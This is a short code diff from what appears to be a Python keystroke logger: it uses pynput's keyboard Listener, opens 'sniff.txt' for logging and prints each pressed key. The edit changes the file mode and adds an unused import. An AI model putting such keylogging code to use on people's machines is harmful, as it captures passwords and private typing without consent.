@@ -1,6 +1,7 @@
 from pkg_resources import working_set
 from pynput.keyboard import Listener , Key
-f = open('sniff.txt','a')
+from pytz import common_timezones_set
+f = open('sniff.txt','w')
 log = ""
 def on_press(key):
     print("{0} pressed".format(key))
